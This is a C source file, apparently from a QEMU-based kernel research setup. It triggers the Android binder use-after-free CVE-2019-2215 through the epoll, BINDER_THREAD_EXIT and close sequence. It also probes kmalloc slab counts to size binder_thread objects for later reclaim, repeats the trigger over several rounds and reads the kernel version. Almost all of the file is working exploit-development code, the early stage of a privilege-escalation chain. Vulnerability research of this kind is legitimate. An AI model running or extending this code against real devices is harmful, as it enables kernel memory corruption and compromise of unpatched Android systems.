/*
 * uaf_minimal.c — Minimal CVE-2019-2215 UAF verification
 *
 * Stripped-down test: just trigger the UAF, check for kernel messages.
 * Also test: can we detect the UAF by creating a SECOND binder_thread
 * that reclaims the first one's slot?
 *
 * Build: .\qemu\build-arm.bat src\uaf_minimal.c uaf_minimal
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)

static long read_slab(const char *cache) {
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[512]; long count = -1;
    if (!f) return -1;
    while (fgets(line, sizeof(line), f))
        if (strncmp(line, cache, strlen(cache)) == 0 && line[strlen(cache)] == ' ')
            { sscanf(line + strlen(cache) + 1, "%ld", &count); break; }
    fclose(f);
    return count;
}

int main(void) {
    printf("=== Minimal UAF Test ===\n\n");

    /* Pin to CPU 0 */
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* ===== TEST 1: Basic UAF (no reclaim) ===== */
    printf("=== TEST 1: Basic UAF without reclaim ===\n");

    /* Count dmesg lines before */
    FILE *dm = popen("dmesg | wc -l", "r");
    int dmesg_before = 0;
    if (dm) { fscanf(dm, "%d", &dmesg_before); pclose(dm); }

    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    int r = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    printf("  epoll_ctl: %d\n", r);

    int thr = 0;
    r = ioctl(bfd, BINDER_THREAD_EXIT, &thr);
    printf("  THREAD_EXIT: %d (errno=%s)\n", r, r < 0 ? strerror(errno) : "none");

    printf("  Calling close(epfd)...\n");
    close(epfd);
    printf("  close(epfd) returned\n");

    close(bfd);

    /* Check dmesg after */
    dm = popen("dmesg | wc -l", "r");
    int dmesg_after = 0;
    if (dm) { fscanf(dm, "%d", &dmesg_after); pclose(dm); }

    printf("  dmesg lines: before=%d after=%d (new=%d)\n",
           dmesg_before, dmesg_after, dmesg_after - dmesg_before);

    if (dmesg_after > dmesg_before) {
        printf("  New dmesg messages:\n");
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "dmesg | tail -%d", dmesg_after - dmesg_before);
        dm = popen(cmd, "r");
        if (dm) {
            char line[512];
            while (fgets(line, sizeof(line), dm))
                printf("    %s", line);
            pclose(dm);
        }
    }
    printf("\n");

    /* ===== TEST 2: Verify binder_thread size ===== */
    printf("=== TEST 2: binder_thread size estimation ===\n");

    /* Allocate 50 binder threads, measure slab delta */
    int bfds[50];
    int epfds[50];

    long s0 = read_slab("kmalloc-256");
    long s0_128 = read_slab("kmalloc-128");
    long s0_192 = read_slab("kmalloc-192");

    for (int i = 0; i < 50; i++) {
        bfds[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        mx = 0;
        ioctl(bfds[i], BINDER_SET_MAX_THREADS, &mx);
        epfds[i] = epoll_create1(O_CLOEXEC);
        ev.events = EPOLLIN;
        epoll_ctl(epfds[i], EPOLL_CTL_ADD, bfds[i], &ev);
        /* This creates 1 binder_thread per binder_fd (via binder_poll) */
    }

    long s1 = read_slab("kmalloc-256");
    long s1_128 = read_slab("kmalloc-128");
    long s1_192 = read_slab("kmalloc-192");

    printf("  After 50 binder_threads (via epoll_ctl):\n");
    printf("    k128: %+ld  k192: %+ld  k256: %+ld\n",
           s1_128 - s0_128, s1_192 - s0_192, s1 - s0);

    /* Now free all threads */
    for (int i = 0; i < 50; i++) {
        thr = 0;
        ioctl(bfds[i], BINDER_THREAD_EXIT, &thr);
    }

    long s2 = read_slab("kmalloc-256");
    long s2_128 = read_slab("kmalloc-128");
    long s2_192 = read_slab("kmalloc-192");

    printf("  After 50 THREAD_EXIT:\n");
    printf("    k128: %+ld  k192: %+ld  k256: %+ld\n",
           s2_128 - s1_128, s2_192 - s1_192, s2 - s1);

    /* Close all */
    for (int i = 0; i < 50; i++) {
        close(epfds[i]);
        close(bfds[i]);
    }

    long s3 = read_slab("kmalloc-256");
    long s3_128 = read_slab("kmalloc-128");
    long s3_192 = read_slab("kmalloc-192");

    printf("  After close all (50x close(epfd) + close(binder)):\n");
    printf("    k128: %+ld  k192: %+ld  k256: %+ld\n",
           s3_128 - s2_128, s3_192 - s2_192, s3 - s2);
    printf("\n");

    /* ===== TEST 3: Verify epoll entry is on thread->wait, not proc->wait ===== */
    printf("=== TEST 3: Verify wait queue target ===\n");
    printf("  (If close(epfd) after THREAD_EXIT hangs → entry was on thread->wait)\n");
    printf("  (If it completes → entry was on proc->wait OR freed memory was safe)\n");

    /* Multiple rounds to confirm consistency */
    for (int round = 0; round < 5; round++) {
        bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        mx = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

        epfd = epoll_create1(O_CLOEXEC);
        ev.events = EPOLLIN;
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        thr = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &thr);

        close(epfd); /* If this hangs, the entry was on freed memory with non-zero spinlock */
        close(bfd);
        printf("  Round %d: OK (close(epfd) completed)\n", round);
    }
    printf("\n");

    /* ===== TEST 4: Check /proc/version for kernel details ===== */
    printf("=== TEST 4: Kernel version ===\n");
    dm = popen("cat /proc/version", "r");
    if (dm) {
        char line[512];
        if (fgets(line, sizeof(line), dm))
            printf("  %s", line);
        pclose(dm);
    }

    printf("\n=== Done ===\n");
    return 0;
}
